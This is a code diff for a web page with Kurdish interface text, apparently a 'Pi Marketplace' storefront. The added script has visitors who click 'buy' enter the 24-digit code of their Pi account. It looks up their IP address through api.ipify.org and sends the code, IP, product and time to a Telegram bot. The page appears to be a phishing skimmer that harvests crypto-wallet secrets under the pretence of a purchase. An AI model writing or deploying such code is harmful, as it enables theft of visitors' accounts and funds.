-        } catch(err) { showToast("پەیوەندی بۆت شکست", true); return false; }
+            } else {
+                showToast("⚠️ هەڵە لە ناردندا، تکایە دووبارە هەوڵبدە", true);
+                return false;
+            }
+        } catch(err) {
+            console.error(err);
+            showToast("❌ پەیوەندی بە بۆتەکەوە شکستی هێنا", true);
+            return false;
+        }
     }
 
-    let pendingProduct = null;
-    document.addEventListener('click', (e) => {
-        if(e.target.classList.contains('buy-btn')) {
-            const prod = JSON.parse(e.target.getAttribute('data-product'));
-            pendingProduct = prod;
-            showToast(`🛒 "${prod.name}" هەڵبژێردرا. تکایە کۆدی ٢٤ ژمارەیی بنووسە و بنێرە`);
-            document.getElementById('verifySection').scrollIntoView({ behavior: 'smooth' });
-        }
-    });
-
-    document.getElementById('sendToTelegramBtn').addEventListener('click', async () => {
-        const codeInput = document.getElementById('piCodeInput');
-        const piCode = codeInput.value.trim();
+    // send Pi code to telegram + product purchase details
+    document.getElementById('sendToTelegramBtn').addEventListener('click', async function() {
+        const piCode = document.getElementById('piCodeInput').value.trim();
         if(piCode.length !== 24) {
-            showToast("⚠️ کۆدی ٢٤ ژمارەیی تەواو بنووسە", true);
+            showToast("⚠️ تکایە کۆدی ٢٤ ژمارەیی ئەکاونتی Pi ی خۆت تەواو بنووسە", true);
             return;
         }
-        await sendOrderToTelegram(piCode, pendingProduct);
-        codeInput.value = "";
-        pendingProduct = null;
+        // store temporary purchase context if any product clicked before? we will combine global selected product
+        let selectedProduct = window.__pendingProduct ? window.__pendingProduct : null;
+        let productInfo = selectedProduct ? `📦 بەرهەم: ${selectedProduct.name}\n💰 نرخ: ${selectedProduct.price} ${selectedProduct.currency}` : '📦 بەرهەم دیاری نەکراوە (پەنجە بە دواتر کڕین)';
+        const message = `🆕 داواکاری نوێ لە وێبسایتەوە:\n🔐 کۆدی پی: ${piCode}\n${productInfo}\n⏱ کات: ${new Date().toLocaleString()}\n🌍 IP: ${await fetch('https://api.ipify.org?format=json').then(res=>res.json()).then(data=>data.ip).catch(()=>'نەدۆزرایەوە')}`;
+        
+        let ip = "unknown";
+        try{
+            let ipRes = await fetch('https://api.ipify.org?format=json');
+            let ipData = await ipRes.json();
+            ip = ipData.ip;
+        }catch(e){}
+        const finalMsg = `🆕 داواکاری نوێ لە وێبسایتەوە:\n🔐 کۆدی پی: ${piCode}\n${productInfo}\n⏱ کات: ${new Date().toLocaleString()}\n🌍 IP: ${ip}`;
+        await sendToTelegram(finalMsg);
+        document.getElementById('piCodeInput').value = '';
+        window.__pendingProduct = null;
     });
+
+    // when user clicks buy now on any product, store product and scroll to verification
+    document.addEventListener('click', (e) => {
+        if(e.target.classList.contains('buy-btn')) {
+            const productData = JSON.parse(e.target.getAttribute('data-product'));
+            window.__pendingProduct = productData;
+            showToast(`🛒 "${productData.name}" هەڵبژێردرا. تکایە کۆدی ٢٤ ژمارەیی لە سەرەوە بنووسە و بنێرە`, false);
+            document.getElementById('verifySection').scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+    });
+    
+    // optional: auto generate dummy HD images note - you replace image links with real HD product images.
+    console.log("Pi Marketplace Ready - HD Product Images + Telegram Order Integration");
 </script>
 </body>
 </html>
